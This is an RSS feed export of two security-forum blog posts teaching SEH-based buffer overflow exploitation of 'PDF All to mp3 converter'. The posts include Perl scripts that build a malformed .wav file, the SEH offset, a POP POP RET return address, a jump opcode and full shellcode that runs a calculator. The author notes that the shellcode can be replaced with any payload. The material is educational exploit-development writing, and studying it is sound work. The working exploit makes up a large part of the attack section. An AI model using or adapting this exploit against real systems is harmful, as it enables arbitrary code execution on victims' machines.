<?xml version="1.0" encoding="ISO-8859-1"?>

<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
	<channel>
		<title>Garage4hackers Forum - Blogs - m0nna</title>
		<link>http://garage4hackers.com/blog.php?u=1164</link>
		<description>Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research.</description>
		<language>en</language>
		<lastBuildDate>Sun, 22 Mar 2020 10:49:16 GMT</lastBuildDate>
		<generator>vBulletin</generator>
		<ttl>60</ttl>
		<image>
			<url>http://garage4hackers.com/images/misc/rss.jpg</url>
			<title>Garage4hackers Forum - Blogs - m0nna</title>
			<link>http://garage4hackers.com/blog.php?u=1164</link>
		</image>
		<item>
			<title>SEH Overflow exploit POC Part 2</title>
			<link>http://garage4hackers.com/entry.php?b=238</link>
			<pubDate>Mon, 19 Sep 2011 20:53:40 GMT</pubDate>
			<description>*_Exploiting the SEH overflow in A-PDF all to mp3 converter_* 
 
1) I wrote a perl script that creates a “wav” file with 5000 A’s as shown below: 
...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><b><u>Exploiting the SEH overflow in A-PDF all to mp3 converter</u></b><br />
<br />
1) I wrote a perl script that creates a “wav” file with 5000 A’s as shown below:<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:96px;">    #!/usr/bin/perl -w
    use strict;
    my $file = &quot;exploit_seh.wav&quot;;
    my $junk =&quot;\x41&quot; x 5000 ;
    open OUTPUT, &quot;&gt;&quot;, &quot;$file&quot;;
    print OUTPUT $junk;</pre>
</div>This script creates a file “exploit_seh.wav”.<br />
<br />
2)	After I open the created file “exploit_seh.wav” with “A-pdf all to mp3 converter”, the software silently crashes without any error message. (This is probably because we overwrote the seh handler, which was suppose to handle exception.)<br />
<br />
3)	To check what happened, this time i open the debugger “immunity debugger “ and attach the debugger to the process “Alltomp3” as shown below:<br />
<br />
<a href="http://imageshack.us/photo/my-images/683/attachtoprocess2.png/" target="_blank"><img src="http://img683.imageshack.us/img683/7799/attachtoprocess2.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
4)	Afer attaching the debugger to the process, now run the program and then open the created file “exploit_seh.wav” with “PDf all to mp3 converter”, this time you find that the program crashes and eip is overwritten with 41414141 (AAAA) as shown in the below figure. <br />
<br />
<a href="http://imageshack.us/photo/my-images/853/alltomp3.png/" target="_blank"><img src="http://img853.imageshack.us/img853/439/alltomp3.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
<a href="http://imageshack.us/photo/my-images/836/openfile4.png/" target="_blank"><img src="http://img836.imageshack.us/img836/7049/openfile4.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
<a href="http://imageshack.us/photo/my-images/190/aaaaaa5.png/" target="_blank"><img src="http://img190.imageshack.us/img190/7115/aaaaaa5.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
5)	Since we have control over eip, we can write a classic stack based buffer overflow exploit but since we want to write a reliable exploit,  let us see if we can write a seh based exploit. After looking into the seh chain i find that our seh handler is also overwritten with 41414141 (AAAA) as shown below. This means we now have control over seh handler.<br />
<br />
<a href="http://imageshack.us/photo/my-images/101/sehandler6.png/" target="_blank"><img src="http://img101.imageshack.us/img101/397/sehandler6.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
After following the seh chain in the stack, we find that pointer to the next seh record and address of the seh handler is also overwritten with 41414141 (AAAA). As shown below (see the lower right corner)…so now we have control over pointer to the next seh record and also the seh handler.<br />
<br />
<a href="http://imageshack.us/photo/my-images/189/sehandleroverwrite7.png/" target="_blank"><img src="http://img189.imageshack.us/img189/3134/sehandleroverwrite7.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<b><u><br />
Finding offset to the seh handler</u></b><br />
<br />
1)	Now to write an seh based exploit, we have to know where exactly our seh handler is located. To find the exact offset, let us create a pattern of 5000 characters using metasploit and replace the 5000 A’s in our perl script with this pattern as shown below:<br />
<br />
<a href="http://imageshack.us/photo/my-images/690/offset8.png/" target="_blank"><img src="http://img690.imageshack.us/img690/1387/offset8.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
Perl script with a pattern of 5000 characters is shown below:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:84px;">my $file = &quot;exploit_seh.wav&quot;;
my $junk =&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk&quot;;

open OUTPUT, &quot;&gt;&quot;, &quot;$file&quot;;
print OUTPUT $junk;</pre>
</div>2)	After running the script “exploit_seh.wav” file is created, now attach the debugger to the process and after opening the exploit_seh.wav file with “PDF All to mp3 converter” we find that seh handler contains the pattern 39684638, because of the little endian format you will have to read it as 38 46 68 39 which stands for 8Fh9<br />
<br />
<a href="http://imageshack.us/photo/my-images/707/sehandleroverwrite9.png/" target="_blank"><img src="http://img707.imageshack.us/img707/3196/sehandleroverwrite9.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
<a href="http://imageshack.us/photo/my-images/89/sehandleroverwrite10.png/" target="_blank"><img src="http://img89.imageshack.us/img89/832/sehandleroverwrite10.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
3)	Now let us give this value to the pattern_offset.rb (ruby script in metasploit), after giving this value to the metasploit i found that the offset to the seh handler is 4136, which means the offset of the pointer to the next seh record is 4136-4 = 4132<br />
<br />
<a href="http://imageshack.us/photo/my-images/153/offset11.png/" target="_blank"><img src="http://img153.imageshack.us/img153/7900/offset11.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
4)	Now let us modify our script to contain 4132 A’s followed by break (“\xcc\xcc\xcc\xcc”) instruction then seh handler would contain address of pop pop ret instruction and then a pattern (this will be replaced with our shellcode). <br />
<br />
If everything works well the application should run and when the exception occurs, the control is passed to the seh handler (which executes POP POP RET instruction, which removes first 8 bytes from the stack and puts the next 4 bytes into EIP, which is the address of the pointer to the next seh record ) because of this the instruction at the pointer to the next seh record is executed (which is the break instruction), so if the exploit succeeds the application should pause at break instruction (“\xcc\xcc\xcc\xcc”)<br />
<b><u><br />
Finding the address of POP POP RET</u></b><br />
<br />
5)	 Before we modify the script, Lets us find the address of pop pop ret in the application dll and also we should make sure that the dll doesn’t use the safeseh protection (i.e compiled with safeseh)…to find the application dll’s that are not safeseh compiled, we can use a immunity debugger plugin called pvefindaddr, this plugin will display the dll’s which are not safeseh complied (displayed in red) and then we can use the address of POP POP RET instruction from the non safeseh compiled Dll or EXE. The below figure shows pvefindaddr plugin showing the non safeseh dll’s and EXE’s in red.<br />
<br />
<a href="http://imageshack.us/photo/my-images/545/poppopret12.png/" target="_blank"><img src="http://img545.imageshack.us/img545/411/poppopret12.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
6)	From the above figure we see that there are 4 application dll’s and EXE’s which are not compiled with safeseh protection (shown in red in the above figure)....i have chosen the application EXE “Alltomp3.exe” to find the address of POP POP RET.<br />
<br />
7)	To find the address of POP POP RET from the EXE, we can use another ruby script in metasploit (msfpescan) as shown below.<br />
<br />
<a href="http://imageshack.us/photo/my-images/571/poppopret13.png/" target="_blank"><img src="http://img571.imageshack.us/img571/5833/poppopret13.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
8)	I will use the last address 0x005d6a91 (address of pop pop ret instruction)….now the modified script is shown below, now if the exploit works the application should pause at the break instruction (\xcc\xcc\xcc\xcc). If this works then we will replace the shellcode with real shellcode.<br />
<br />
The perl script looks like this<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:180px;">#!/usr/bin/perl -w
use strict;


my $file = &quot;exploit_seh.wav&quot;;
my $junk = &quot;\x41&quot; x 4132;   # 4132 A’s
my $nseh = &quot;\xcc\xcc\xcc\xcc&quot;;  #break
my $seh = pack(&quot;V&quot;, 0x005d6a91); #address of pop pop ret 
my $shellcode = &quot;1ABCDEFGHIJKLMNOPQRSTUV2ABCDEFGHIJKLMNOPQRSTUV3ABCDEFGHIJKLMNOPQRSTUV4ABCDEFGHIJKLMNOPQRSTUV5ABCDEFGHIJKLMNOPQRSTUV&quot;;


open OUTPUT, &quot;&gt;&quot;, &quot;$file&quot;;
print OUTPUT $junk.$nseh.$seh.$shellcode;</pre>
</div>9)	Now I open the Alltomp3.exe using immunity debugger and run it and then open the file “exploit_seh.wav” created from the above script, now the exception occurs as shown in the figure below (left bottom corner)<br />
<br />
<a href="http://imageshack.us/photo/my-images/231/debuggersehoverwrite14.png/" target="_blank"><img src="http://img231.imageshack.us/img231/858/debuggersehoverwrite14.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
After pressing shift+F9, the exception is passed to exception handler you will see that the application breaks at \XCC as expected…and also in the memory dump (lower left pane) you will see our shellcode (which is at plus 6 bytes)….it looks like everything is working fine.<br />
<br />
<a href="http://imageshack.us/photo/my-images/199/debuggerseh15.png/" target="_blank"><img src="http://img199.imageshack.us/img199/9776/debuggerseh15.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
10)	Now since our shellcode is at plus 6 bytes, instead of break instruction (\xcc\xcc\xcc\xcc) we will use jmp + 6 bytes, so when the application runs it will jump to our shellcode and execute it, the opcode for jmp + 6 bytes is (\xeb\x06\x90\x90) and we will also replace our shellcode with real shellcode (shellcode to pop a calculator)….The modified script looks like this.<br />
If everthing works well, it should pop a calculator<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">   my $file = &quot;exploit_seh.wav&quot;;
   my $junk =&quot;\x41&quot; x 4132 ;
   my $nseh = &quot;\xeb\x06\x90\x90&quot;;
   my $seh = pack(&quot;V&quot;, 0x005d6a91);
   my $shellcode = &quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49&quot;.
&quot;\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36&quot;.
&quot;\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34&quot;.
&quot;\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41&quot;.
&quot;\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44&quot;.
&quot;\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37&quot;.
&quot;\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48&quot;.
&quot;\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48&quot;.
&quot;\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c&quot;.
&quot;\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e&quot;.
&quot;\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48&quot;.
&quot;\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54&quot;.
&quot;\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48&quot;.
&quot;\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43&quot;.
&quot;\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57&quot;.
&quot;\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a&quot;.
&quot;\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b&quot;.
&quot;\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53&quot;.
&quot;\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37&quot;.
&quot;\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49&quot;.
&quot;\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46&quot;.
&quot;\x4e\x36\x43\x46\x42\x50\x5a&quot;;

open OUTPUT, &quot;&gt;&quot;, &quot;$file&quot;;

print OUTPUT $junk.$nseh.$seh.$shellcode;</pre>
</div>11)	 After running the script “exploit_seh.wav” file is created and after opening the file with the PDF All to mp3 converter, the calculator application is run as shown below.<br />
<br />
<a href="http://imageshack.us/photo/my-images/824/calc17.png/" target="_blank"><img src="http://img824.imageshack.us/img824/5701/calc17.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
Now we have a working SEH based exploit (you can replace the shellcode to pop calculator with the shellcode to do anything that you want the application to do)<br />
<br />
<br />
<b><u>Summary</u></b><br />
<br />
Hopefully this post will provide you with a basic understanding of SEH overflow vulnerability and exploit development<br />
<br />
<b><u>References</u></b><br />
<br />
<a href="https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/" target="_blank">https://www.corelan.be/index.php/cat...ing-tutorials/</a></blockquote>

]]></content:encoded>
			<dc:creator>m0nna</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=238</guid>
		</item>
		<item>
			<title>SEH Overflow exploit POC  Part 1</title>
			<link>http://garage4hackers.com/entry.php?b=237</link>
			<pubDate>Mon, 19 Sep 2011 20:14:02 GMT</pubDate>
			<description><![CDATA[On 18th Jan 2011,  somebody named &#8220;h1ch4m&#8221; reported a stack based overflow vulnerability in &#8220;PDF All to mp3 converter&#8221; via exploit-db (Exploits...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">On 18th Jan 2011,  somebody named &#8220;h1ch4m&#8221; reported a stack based overflow vulnerability in &#8220;PDF All to mp3 converter&#8221; via exploit-db (<a href="http://www.exploit-db.com" target="_blank">Exploits Database by Offensive Security</a>).  This vulnerability can be exploited by giving a malformed &#8220;.wav&#8221; file to the application. When i was checking the software on 29th jan 2011, i also found that it was also vulnerable to SEH overflow vulnerability, so i decided to write an exploit for the SEH overflow and submit to exploit-db (community based database of exploit and also great resource for penetration testers and vulnerability researchers). The SEH overflow exploit which i wrote can be found at &#8220;<a href="http://www.exploit-db.com/exploits/16073/" target="_blank">http://www.exploit-db.com/exploits/16073/</a>. Before i get into explaining how to exploit the SEH overflow exploit in &#8220;PDF All to mp3 converter&#8221;, i will explain some of the basics required to understand SEH overflow exploit. <br />
<br />
<b><u>Basics</u></b><br />
<br />
<b>What are exception handlers?</b><br />
<br />
An exception handler is a piece of code that is written inside an application to deal with the exception thrown by the application.<br />
Windows has a default SEH (Structured Exception Handler) which will catch exceptions. If Windows catches an exception, you&#8217;ll see a &#8220;xxx has encountered a problem and needs to close&#8221; popup. This is often the result of the default handler kicking in.<br />
Whenever an exception occurs in an application and when no exception handlers are used, or when exception handler is not available to process the exception, the windows SEH (structured exception handler) will be used. So whenever an exception occurs, the application gets a chance to catch the exception and do something with it. if no exception handler is defined in the application, the OS catches the exception and shows the pop up (asking you to send the error report to Microsoft).<br />
In order for the application to be able to go the exception handler code, the pointer(address) of the exception handler code is saved on the stack. The information about all the exception handlers for an application is stored in an exception_registration structure (SEH chain) on the stack.<br />
<br />
This structure which is also called &#8220;SEH record&#8221; is 8bytes and has two 4 byte elements:<br />
a)	Pointer to the next seh record, in case the current handler is not able to handle the exception.<br />
b)	A pointer to the actual code of the exception handler also called &#8220;SE handler&#8221;.<br />
 <br />
The structure of the SEH chain on the stack is shown below:<br />
<br />
<a href="http://imageshack.us/photo/my-images/27/sehstructure111.png/" target="_blank"><img src="http://img27.imageshack.us/img27/431/sehstructure111.png" border="0" alt="" /></a><br />
<br />
Uploaded with <a href="http://imageshack.us" target="_blank">ImageShack.us</a><br />
<br />
<b><u>So how does the exception handler work.</u></b><br />
<br />
